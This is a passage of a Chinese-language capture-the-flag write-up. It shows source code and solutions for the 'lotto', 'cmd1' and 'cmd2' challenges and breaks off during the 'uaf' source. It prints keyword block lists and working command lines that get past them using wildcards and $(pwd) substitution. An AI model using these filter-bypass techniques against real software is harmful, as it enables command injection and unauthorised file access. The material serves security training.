</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>lotto</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>lotto</span><span class=p>,</span> <span class=mi>6</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>6</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;error2. tell admin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>%</span> <span class=mi>45</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>        <span class=c1>// 1 ~ 45
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// calculate lotto score
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>match</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=n>j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>j</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>submit</span><span class=p>[</span><span class=n>j</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>                <span class=n>match</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// win!
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=n>match</span> <span class=o>==</span> <span class=mi>6</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;bad luck...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>help</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;- nLotto Rule -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;nlotto is consisted with 6 random natural numbers less than 46</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;your goal is to match lotto numbers as many as you can</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;if you win lottery for *1st place*, you will get reward</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;for more details, follow the link below</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;mathematical chance to win this game is known to be 1/8145060.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// menu
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>menu</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;- Select Menu -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;1. Play Lotto</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;2. Help</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;3. Exit</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>menu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>switch</span><span class=p>(</span><span class=n>menu</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>1</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=nf>play</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>2</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=nf>help</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>3</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;bye</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;invalid menu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>很简单的彩票程序，利用伪随机数生成 6 个 <code>1 - 45</code> 之间的彩票号码，然后跟输入比对，如果全中则显示 flag。这个程序如此简单以至于其中的一个细节很容易被忽略：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// calculate lotto score
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>int</span> <span class=n>match</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=n>j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>j</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>submit</span><span class=p>[</span><span class=n>j</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>            <span class=n>match</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>这是比对彩票号码的代码，初看之下没什么问题，但是如果让我们自己来写，正常的写法肯定是：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>submit</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>match</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>但这里却用了两层循环，并不是像我们想的那样比较对应位，而是从 <code>lotto</code> 和 <code>submit</code> 中各自任取一位，进行共 36 次比较。而对 <code>match</code> 的要求是 6，也就是说 36 次比较中有 6 次正确即可。</p><p>为了让成功的机率最大，我们可以输入 6 个相同的数字 <code>x</code>，只要在 <code>lotto</code> 中有一个号码等于 <code>x</code>，那么我们就成功了，这个概率还是比较大的。</p><p>需要注意的是输入的字节范围是从 <code>\x01</code> 到 <code>\x45</code>（<code>-</code>），而不是数字 <code>1-45</code>。</p><h2 id=cmd1 class="relative group">cmd1 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#cmd1 aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>filter</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>cmd</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>r</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;flag&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;sh&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;tmp&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>**</span> <span class=n>envp</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nf>putenv</span><span class=p>(</span><span class=s>&#34;PATH=/thankyouverymuch&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>filter</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>需要一个命令行参数，但参数中不能包含 <code>flag</code>，<code>sh</code> 和 <code>tmp</code>，这个我们可以利用通配符绕过。注意到环境变量 <code>PATH</code> 被覆盖，因此我们调用命令时需要使用绝对路径。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ./cmd1 <span class=s2>&#34;/bin/cat /home/cmd1/fla*&#34;</span>
</span></span></code></pre></div><h2 id=cmd2 class="relative group">cmd2 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#cmd2 aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>filter</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>cmd</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>r</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;=&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;PATH&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;export&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;/&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;`&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>+=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;flag&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>extern</span> <span class=kt>char</span><span class=o>**</span> <span class=n>environ</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>delete_env</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>**</span> <span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=n>p</span><span class=o>=</span><span class=n>environ</span><span class=p>;</span> <span class=o>*</span><span class=n>p</span><span class=p>;</span> <span class=n>p</span><span class=o>++</span><span class=p>)</span>    <span class=nf>memset</span><span class=p>(</span><span class=o>*</span><span class=n>p</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=o>*</span><span class=n>p</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>**</span> <span class=n>envp</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nf>delete_env</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>putenv</span><span class=p>(</span><span class=s>&#34;PATH=/no_command_execution_until_you_become_a_hacker&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nf>filter</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>这次删除了所有环境变量并覆盖了 <code>PATH</code>，同时增强了对命令行参数的过滤，关键在于 <code>/</code> 被过滤了，不能直接写路径。</p><p>那么我们就需要执行系统命令来构造出 <code>/</code>，很容易想到 <code>pwd</code> 命令。我们先 <code>cd /</code>，此时运行 <code>pwd</code> 可以看到输出就是 <code>/</code>。</p><p>仿照 cmd1：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /home/cmd2/cmd2 <span class=s2>&#34;</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=s2>bin</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=s2>cat </span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=s2>home</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=s2>cmd2</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=s2>fla*&#34;</span>
</span></span></code></pre></div><p>但是这样没有用，猜想是因为 <code>$(pwd)</code> 先被替换成 <code>/</code> 了，因为双引号不会忽略 <code>$</code>。我们用单引号就可以防止这一替换。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /home/cmd2/cmd2 <span class=s1>&#39;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*&#39;</span>
</span></span></code></pre></div><h2 id=uaf class="relative group">uaf <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#uaf aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;iostream&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstring&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstdlib&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>using</span> <span class=k>namespace</span> <span class=n>std</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Human</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>private</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=k>virtual</span> <span class=kt>void</span> <span class=n>give_shell</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>protected</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>age</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>string</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=k>virtual</span> <span class=kt>void</span> <span class=n>introduce</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;My name is &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>name</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;I am &#34;</span><span class=o>&lt;&lt;</span> <span class=n>age</span> <span class=o>&lt;&lt;</span><span class=s>&#34; years old&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Man</span><span class=o>:</span> <span class=k>public</span> <span class=n>Human</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=n>Man</span><span class=p>(</span><span class=n>string</span> <span class=n>name</span><span class=p>,</span> <span class=kt>int</span> <span class=n>age</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>=</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>-&gt;</span><span class=n>age</span> <span class=o>=</span> <span class=n>age</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>virtual</span> <span class=kt>void</span> <span class=nf>introduce</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>Human</span><span class=o>::</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;I am a nice guy!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Woman</span><span class=o>:</span> <span class=k>public</span> <span class=n>Human</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=n>Woman</span><span class=p>(</span><span class=n>string</span> <span class=n>name</span><span class=p>,</span> <span class=kt>int</span> <span class=n>age</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>this</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>=</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>this</span><span class=o>-&gt;</span><span class=n>age</span> <span class=o>=</span> <span class=n>age</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>virtual</span> <span class=kt>void</span> <span class=nf>introduce</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>                <span class=n>Human</span><span class=o>::</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;I am a cute girl!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>    <span class=n>Human</span><span class=o>*</span> <span class=n>m</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Man</span><span class=p>(</span><span class=s>&#34;Jack&#34;</span><span class=p>,</span> <span class=mi>25</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>Human</span><span class=o>*</span> <span class=n>w</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Woman</span><span class=p>(</span><span class=s>&#34;Jill&#34;</span><span class=p>,</span> <span class=mi>21</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>size_t</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>op</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;1. use</span><span class=se>\n</span><span class=s>2. after</span><span class=se>\n</span><span class=s>3. free</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>cin</span> <span class=o>&gt;&gt;</span> <span class=n>op</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>switch</span><span class=p>(</span><span class=n>op</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>1</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=n>m</span><span class=o>-&gt;</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=n>w</span><span class=o>-&gt;</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>2</span><span class=o>:</span>
